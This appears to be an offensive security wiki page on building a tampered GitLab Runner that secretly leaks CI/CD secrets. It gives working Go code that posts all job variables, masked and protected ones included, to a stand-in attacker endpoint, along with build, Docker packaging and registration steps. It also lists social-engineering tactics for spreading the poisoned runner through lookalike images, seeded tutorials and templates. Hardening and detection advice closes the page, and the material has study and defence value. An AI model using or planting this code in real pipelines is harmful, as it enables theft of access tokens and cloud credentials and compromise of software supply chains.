# Abusing GitLab Runner: Secrets Exfiltration via Tampered Runner

{{#include ../../banners/hacktricks-training.md}}

## Overview

If a GitLab instance hands job payloads (including masked/protected CI/CD variables) to an untrusted or tampered runner binary/image, the runner can silently exfiltrate those secrets. This is independent of container isolation: once the platform injects secrets into the job context, the runner can read and leak them.

Historically, GitLab did not validate the runner binary/image integrity before dispatching jobs. A malicious actor could ship a drop‑in runner that behaves normally while posting all environment variables to an external server. GitLab has since hardened server‑side validation, but the technique remains important for offensive testing and for understanding the trust boundary.

Threat model:
- Attacker can replace or trick admins into installing a malicious runner binary/image, or gets a runner registered in the instance/group/project.
- Jobs run on the malicious runner, which reads variables and exfiltrates them.

Impact examples:
- Steal PATs, project/group access tokens, cloud credentials (AWS/GCP/Azure), KUBE_TOKEN/KUBECONFIG, and any protected variables.
- With stolen tokens: create branches, bypass reviews via token abuse, modify pipelines, deploy to prod, or pivot to cloud infrastructure.

## Where to hook into the Runner

The GitLab Runner source exposes job variables to executors. In the Docker executor (Go):
- File: executors/docker/docker.go
- Variables aggregation: e.Build.GetAllVariables()

Any executor can be modified similarly.

## PoC: Exfiltrate all variables from a Runner build

1) Clone runner source

```
git clone https://gitlab.com/gitlab-org/gitlab-runner.git
cd gitlab-runner
```

2) Edit Docker executor and add sendVariables()

Open executors/docker/docker.go and add:

```go
import (
    "bytes"
    "encoding/json"
    "fmt"
    "net/http"
    "time"
)

func (e *executor) sendVariables() error {
    vars := make(map[string]string)
    for _, v := range e.Build.GetAllVariables() {
        vars[v.Key] = v.Value
    }

    payload, err := json.Marshal(vars)
    if err != nil {
        return fmt.Errorf("failed to marshal variables: %w", err)
    }

    client := &http.Client{Timeout: 15 * time.Second}
    req, err := http.NewRequest("POST", "https://ATTACKER-ENDPOINT", bytes.NewBuffer(payload))
    if err != nil {
        return fmt.Errorf("failed to create HTTP request: %w", err)
    }
    req.Header.Set("Content-Type", "application/json")

    resp, err := client.Do(req)
    if err != nil {
        return fmt.Errorf("HTTP POST failed: %w", err)
    }
    defer resp.Body.Close()

    fmt.Println("Exfil POST status:", resp.Status)
    return nil
}
```

Call it from a code path that observes variables, for example at the end of:

```go
func (e *executor) Prepare(options common.ExecutorPrepareOptions) error { 
    ...
    _ = e.sendVariables()
    return nil
}
```

or in:

```go
func (e *executor) createContainer(...) (...) {
    ...
    _ = e.sendVariables()
}
```

3) Build a native runner binary (no make)

```
go build -o gitlab-runner .
```

4) Package a Docker image that wraps the patched binary

Dockerfile:

```
FROM debian:bookworm-slim
RUN apt-get update && apt-get install -y \
  ca-certificates \
  git \
  curl \
  && rm -rf /var/lib/apt/lists/*
COPY gitlab-runner /usr/bin/gitlab-runner
ENTRYPOINT ["/usr/bin/gitlab-runner"]
```

Build:

```
docker build -t my-gitlab-runner .
```

5) Register and run the runner

- Obtain a runner token in the GitLab UI (Instance/Group/Project scope as desired).
- Register:

```
docker run --rm -it --network host \
  -v /etc/gitlab-runner:/etc/gitlab-runner \
  -v /var/run/docker.sock:/var/run/docker.sock \
  my-gitlab-runner register --url http://GITLAB-URL --token RUNNER_TOKEN
```

- Optional host mapping if Runner and GitLab share host (config.toml under [runners.docker]):

```
extra_hosts = ["gitlab.local:host-gateway"]
```

- Run the malicious runner:

```
docker run --rm -it --network host \
  -v /etc/gitlab-runner:/etc/gitlab-runner \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -e RUNNER_DEBUG=true \
  my-gitlab-runner run
```

6) Trigger any job to force exfiltration

.gitlab-ci.yml:

```
stages:
  - test

test_runner:
  stage: test
  script:
    - echo "GitLab Runner is working!"
```

Every job running on the tampered runner will POST all variables returned by GetAllVariables(), including masked/protected ones.

Notes:
- The PoC shows Docker executor, but any executor can be altered similarly.
- Containerization doesn’t protect confidentiality once secrets are injected into the job by GitLab.

## Distribution and social engineering angles

- Publish a lookalike Docker Hub namespace (for example: gitlab-org/gitlab-runner instead of the official gitlab/gitlab-runner).
- Seed tutorials/blogs or internal docs that reference the poisoned image.
- Release a malicious starter template that configures the runner.
- Convince coworkers/sysadmins to install a runner binary from an unofficial source.
- Hide the runner binary inside a helper container used in builds.

## Defensive considerations (hardening and detection)

- Treat the runner as part of the trust boundary. The platform must verify runner integrity before releasing secrets. GitLab introduced server-side validation to only dispatch jobs to official builds (for GitLab-hosted runners and new workflows on self-managed). Keep GitLab and Runner updated.
- Restrict who can create/register runners (use the authentication-token workflow, not legacy registration tokens; approve runner owners).
- Scope variables tightly: use environment-scoped variables, minimal permissions, and avoid long-lived PATs. Prefer job tokens with least privilege.
- Egress control: restrict runner outbound access with network policies/proxies; block calls to unknown endpoints from runner networks.
- Runtime detection: monitor runner hosts/containers for unexpected outbound HTTP(S) to non-approved domains; alert on unusual runner image names or hashes; audit runner registrations and assignments.
- Supply chain: pin to official runner images by digest; mirror and sign artifacts; enforce admission policies (for example: only allow signed images from an internal registry).

## References

- A Simple Supply Chain Bug — Worth $11,850 — How GitLab Reinforces Trust in Open Source (runner integrity verification, PoC): https://medium.com/@justas_b1/a-simple-supply-chain-bug-worth-11-850-how-gitlab-reinforces-trust-in-open-source-424585c79074
- GitLab Runner docs: https://docs.gitlab.com/runner/

{{#include ../../banners/hacktricks-training.md}}